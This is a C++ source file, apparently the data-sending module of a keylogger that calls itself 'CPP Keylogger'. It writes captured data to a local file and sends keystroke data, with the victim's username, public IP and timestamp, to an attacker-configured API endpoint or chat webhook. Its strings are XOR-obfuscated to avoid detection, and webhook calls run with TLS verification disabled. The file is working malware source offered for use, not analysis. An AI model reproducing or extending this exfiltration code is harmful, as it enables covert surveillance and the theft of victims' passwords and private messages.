#include "c_includes.hpp"

namespace c_sender {

	inline size_t write_callback(char* contents, size_t size, size_t nmemb, void* userp) {
		((std::string*)userp)->append((char*)contents, size * nmemb);
		return size * nmemb;
	}

	inline std::string get_ip() {
		CURL* c_url;
		CURLcode code;
		std::string response;

		c_url = curl_easy_init();

		if (c_url) {
			curl_easy_setopt(c_url, CURLOPT_URL, "http://api.ipify.org");
			curl_easy_setopt(c_url, CURLOPT_WRITEFUNCTION, write_callback);
			curl_easy_setopt(c_url, CURLOPT_WRITEDATA, &response);

			code = curl_easy_perform(c_url);

			curl_easy_cleanup(c_url);
		}
		return response;
	}

	inline void save_data(std::string data) {
		FILE* file;

		fopen_s(&file, std::string(c_config::init::destination_path + c_xor("debug.txt")).c_str(), c_xor("wb"));

		fputs(data.c_str(), file); //puts the string argument to the file

		fclose(file);
	}

	inline void api_send(std::string data) {
		CURL* c_url;
		CURLcode code;

		c_url = curl_easy_init();

		if (c_url) {
			data = c_xor("data=") + data + c_xor("&user=") + c_utils::pc_username() + c_xor("&ip=") + get_ip();

			curl_easy_setopt(c_url, CURLOPT_POST, true);
			curl_easy_setopt(c_url, CURLOPT_POSTFIELDS, data.c_str());
			curl_easy_setopt(c_url, CURLOPT_URL, c_config::sender::api_link.c_str());
			
			code = curl_easy_perform(c_url);

			curl_easy_cleanup(c_url);
		}
	}

	inline void webhook_send(std::string data) {
		CURL* c_url;
		CURLcode code;
		curl_slist* list_s = NULL;

		c_url = curl_easy_init();

		if (c_url) {
			//home made json, see line 185 + buggy
			data = c_xor("{ \"embeds\": [{ \"title\": \"CPP Keylogger\", \"fields\": [ { \"name\": \"Data\", \"value\": \"") + std::string(curl_easy_escape(c_url, data.c_str(), data.length())) + c_xor("\" }, {\"name\": \"PC Name\", \"value\": \"") + c_utils::pc_username() + c_xor("\"}, {\"name\": \"Time\", \"value\": \"") + c_utils::time_now() + c_xor("\"}, {\"name\": \"IP\", \"value\": \"") + get_ip() + c_xor("\"} ] }] }"); //curl_easy_escape(c_url, data.c_str(), data.length())

			list_s = curl_slist_append(list_s, c_xor("Content-Type: application/json"));

			curl_easy_setopt(c_url, CURLOPT_POST, true);
			curl_easy_setopt(c_url, CURLOPT_HTTPHEADER, list_s);
			curl_easy_setopt(c_url, CURLOPT_POSTFIELDS, data.c_str());
			curl_easy_setopt(c_url, CURLOPT_URL, c_config::sender::webhook_link.c_str());

			curl_easy_setopt(c_url, CURLOPT_SSL_VERIFYPEER, false);

			code = curl_easy_perform(c_url);

			curl_slist_free_all(list_s);

			curl_easy_cleanup(c_url);
		}
	}

}
























































































/*
⠁⠁⠁⠁⠁⠁⠐⢶⣶⣶⣶⣤⣤⡀⠁⠁⣠⣀⣀⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁
⠁⠁⠁⠁⠁⠁⠁⠁⠙⢿⣯⣠⣶⣦⣤⣤⣌⣛⠻⢇⣠⣤⣤⠁⠁⠁⠁⠁⠁⠁
⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠻⣿⣿⣿⡟⢉⡤⢤⣤⣤⡍⠛⢡⢖⣥⣶⣦⣀⠁⠁
⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⣠⣿⣿⣿⡏⣭⣶⣿⣿⠟⢿⣦⡡⣿⣿⡇⠁⡙⣷⡀
⠁⠁⠁⠁⠁⠁⠁⣀⣴⣿⣿⣿⣿⣿⣿⡞⣿⣿⡟⢀⡀⣿⣿⢻⣿⣿⣀⣁⣿⠏
⠁⠁⠁⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣟⢰⢻⣿⣇⣈⣴⣿⠟⢨⣛⠛⠛⠉⠁⠁
⠁⣠⣶⣿⣿⡟⢋⠤⣤⠘⢿⣿⣧⡙⠻⠌⠒⠙⠛⢛⣫⣥⣿⣦⡈⠉⣡⣴⣾⠇
⢰⣿⣿⣿⣿⠁⡇⠁⠙⠷⣤⡙⠻⢿⣿⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠁⠁
⠘⣿⣿⣿⣿⣆⠻⣄⠁⣀⡀⠉⠙⠒⠂⠉⠍⠉⠉⠉⠉⣩⣍⣁⣂⡈⠠⠂⠁⠁
⠁⠘⢿⣿⣿⣿⣦⡉⠳⢬⣛⠷⢦⡄⠁⠁⠁⠁⠁⣀⣼⣿⣿⠿⠛⠋⠁⠁⠁⠁
⠁⠁⠁⠉⠻⢿⣿⣿⣷⣦⣬⣍⣓⡒⠒⣒⣂⣠⡬⠽⠓⠂⠁⠁⠁⠁⠁⠁⠁⠁
⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁⠁
  ___________|__| ____    ____   ____
_/ ___\_  __ \  |/    \  / ___\_/ __ \
\  \___|  | \/  |   |  \/ /_/  >  ___/
 \___  >__|  |__|___|  /\___  / \___  >
	 \/              \//_____/      \/
*/